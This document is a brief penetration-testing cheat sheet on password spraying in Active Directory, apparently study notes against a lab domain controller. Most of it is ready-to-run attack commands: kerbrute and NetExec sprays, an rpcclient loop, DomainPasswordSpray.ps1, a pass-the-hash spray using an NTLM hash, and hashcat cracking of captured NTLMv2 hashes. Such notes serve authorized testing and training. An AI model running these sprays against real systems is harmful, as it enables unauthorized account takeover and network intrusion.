# 01.19 Password Spraying

> Spray one password against every valid user under the threshold via `kerbrute passwordspray`, CME, or `DomainPasswordSpray.ps1`.

## Overview

Spray one password across all valid users below the lockout threshold. Use kerbrute for Kerberos-based spray, CME for SMB, an rpcclient bash loop for quiet RPC-based validation, and DomainPasswordSpray.ps1 from Windows.

## Steps

- kerbrute passwordspray — Kerberos-based, less noisy.
- CME -u list -p password — pipe through `grep +` for hits.
- rpcclient bash loop — RPC-based spray, quieter than SMB.
- DomainPasswordSpray.ps1 — Windows-native spray with auto policy check.
- hashcat -m 5600 to crack any captured NTLMv2.

## Commands

### kerbrute spray

```bash
kerbrute passwordspray -d <DOMAIN>.local --dc 172.16.5.5 valid_users.txt Welcome1
```

### CME spray

```bash
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### rpcclient loop

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### Hash spray

```bash
sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
